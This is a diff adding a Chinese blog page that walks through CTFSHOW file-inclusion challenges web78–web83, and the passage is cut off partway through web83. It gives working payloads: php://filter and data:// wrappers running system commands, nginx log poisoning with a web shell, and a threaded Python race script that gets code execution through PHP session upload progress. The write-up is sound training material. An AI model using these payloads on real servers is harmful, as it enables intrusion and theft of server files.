@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="文件包含web78源码： 1234567&amp;lt;?phpif(isset($_GET[&apos;file&apos;]))&amp;#123;    $file = $_GET[&apos;file&apos;];    include($file);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; 123?file=php://filter/read=convert.base64-enc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW-web入门-文件包含">
+<meta property="og:url" content="http://yoursite.com/2021/09/29/CTFSHOW-web入门-文件包含/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="文件包含web78源码： 1234567&amp;lt;?phpif(isset($_GET[&apos;file&apos;]))&amp;#123;    $file = $_GET[&apos;file&apos;];    include($file);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; 123?file=php://filter/read=convert.base64-enc">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730152304794.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730153039191.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730153126544.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730153144650.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730153327503.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730153515245.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730162018162.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730162058438.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730162032534.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730162153103.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730162252493.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210730162239561.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210804205348930.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210804205414642.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210804205455864.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210804205603718.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210804205548412.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210810150446961.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/image-20210810150517046.png">
+<meta property="og:image" content="http://images.5666888.xyz//blog/00080067.png">
+<meta property="og:updated_time" content="2021-09-29T03:05:53.366Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTFSHOW-web入门-文件包含">
+<meta name="twitter:description" content="文件包含web78源码： 1234567&amp;lt;?phpif(isset($_GET[&apos;file&apos;]))&amp;#123;    $file = $_GET[&apos;file&apos;];    include($file);&amp;#125;else&amp;#123;    highlight_file(__FILE__);&amp;#125; 123?file=php://filter/read=convert.base64-enc">
+<meta name="twitter:image" content="http://images.5666888.xyz//blog/image-20210730152304794.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2021/09/29/CTFSHOW-web入门-文件包含/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CTFSHOW-web入门-文件包含 | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/09/29/CTFSHOW-web入门-文件包含/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTFSHOW-web入门-文件包含
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-09-29 10:59:48 / Modified: 11:05:53" itemprop="dateCreated datePublished" datetime="2021-09-29T10:59:48+08:00">2021-09-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+<h4 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用str_replace函数把php替换成了???</p>
+<p>用另一个伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=</span></span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs=  <span class="comment">//<span class="meta">&lt;?php</span> system('tac flag.php');</span></span><br></pre></td></tr></table></figure>
+<h4 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了data  上一题的payload不能用了</p>
+<p>随便访问一个不存在的文件可以看到服务器是nginx</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730152304794.png" alt="image-20210730152304794"></p>
+<p>区包含日志文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>因为太乱了  不好看  所以直接传个马</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730153039191.png" alt="image-20210730153039191"></p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730153126544.png" alt="image-20210730153126544"></p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730153144650.png" alt="image-20210730153144650"></p>
+<p>这样也可以</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730153327503.png" alt="image-20210730153327503"></p>
+<h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>包含日志文件 然后包含UA</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//blog/image-20210730153515245.png" alt="image-20210730153515245"></p>
+<h4 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因为过滤了. 无法继续包含access.log了</p>
+<p>新技巧：</p>
+<p><a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">session.upload_progress进行文件包含</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html" target="_blank" rel="noopener">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含 - NPFS - 博客园 <em>c<strong>n</strong>b<strong>l</strong>o<strong>g</strong>s</em>.<em>c<strong>o</strong>m</em></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">问题一代码里没有session_start(),如何创建session文件呢。解答一其实，如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为<span class="number">0</span>。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(<span class="string">"session.upload_progress.prefix"</span>)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。问题二但是问题来了，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空，如何进行rce呢？解答二此时我们可以利用竞争，在session文件内容清空前进行包含利用。                session是以文件的形式保存的php.ini中有个配置项–session.save_path= <span class="string">""</span>;这个里面填写的路径，将会使session文件保存在该路径下。session文件的命名格式是：sess_[PHPSESSID的值]。每一个文件，里面保存了一个会话的数据。其实只要使用代码$_SESSION[<span class="string">'user_id'</span>] = $value;就会促发php的session机制，结果往对应的session文件中写入一个值。    利用前要弄明白下面几个点:        session文件默认路径默认路径:linux: /tmp 或 /<span class="keyword">var</span>/lib/php/sessionWindows：C:\WINDOWS\Temp        session文件名称默认文件名称是 sess_[PHPSESSID的值]ps: session.use_strict_mode默认值为<span class="number">0</span>, 此时用户是可以自己定义Session ID比如，我们在Cookie里设置PHPSESSID=test，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO        session生成机制:a. 代码里面有session_start()在使用类似$_SESSION[<span class="string">'user_id'</span>] = $value;这样的操作时会创建session文件b. 如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start(),但默认情况下，这个选项都是关闭的。        如何控制session文件内容a. session的key或者value等可控b.利用session.upload_progress在session.upload_progress.enabled = on的配置下,upload_progress功能开始.意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度,上传文件名等)存储在session当中 ,但是要注意session.upload_progress.cleanup = on配置,on表示当文件上传结束后，php将会立即清空对应session文件中的内容(可以利用条件竞争来读取)session.uoload_progress一些别的配置:session.upload_progress.prefix 默认值为upload_progress_session.upload_progress.name : The name of the key to be used in $_SESSION storing the progress information.Defaults to “PHP_SESSION_UPLOAD_PROGRESS”如 session.upload_progress.prefix = <span class="string">'upload_progress_'</span> session.upload_progress.name=<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>的条件下,上传文件:</span><br></pre></td></tr></table></figure>
+<p>可以通过上传PHP_SESSION_UPLOAD_PROGRESS</p>
+<p> 然后进行访问/tmp/sess_xxx,进行文件包含</p>
+<p>构造上传</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://addf542d-ec14-4925-b7ed-0a36a4d564dd.challenge.ctf.show:8080/"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>  //关键点</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第一个post包</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730162018162.png" alt="image-20210730162018162"></p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730162058438.png" alt="image-20210730162058438"></p>
+<p>第二个get包</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730162032534.png" alt="image-20210730162032534"></p>
+<p>一起开启爆破</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730162153103.png" alt="image-20210730162153103"></p>
+<p>看到fl0g.php </p>
+<p>修改post包的payload</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730162252493.png" alt="image-20210730162252493"></p>
+<p>继续同时发包</p>
+<p><img src="http://images.5666888.xyz//blog/image-20210730162239561.png" alt="image-20210730162239561"></p>
+<p>通杀脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">'flag'</span></span><br><span class="line">url = <span class="string">'http://7920d625-4983-43eb-9d4f-335e57303fd0.chall.ctf.show/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">'PHPSESSID'</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'&lt;?php system("cat *.php");?&gt;'</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">'file'</span>: (<span class="string">'test.txt'</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">'?file=/tmp/sess_&#123;&#125;'</span>.format(sessID))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*]retrying...'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.set()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>比上一题多了两个函数 </p>
+<p>session_unset();<br>session_destroy();</p>
+<p>出现警告  在进行使用session_destroy()函数必须先调用session_start()函数。</p>
+<p>构造上传</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://9d4ecb4e-30d2-405b-860a-87a76d92636e.challenge.ctf.show:8080/"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>  //关键点</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span 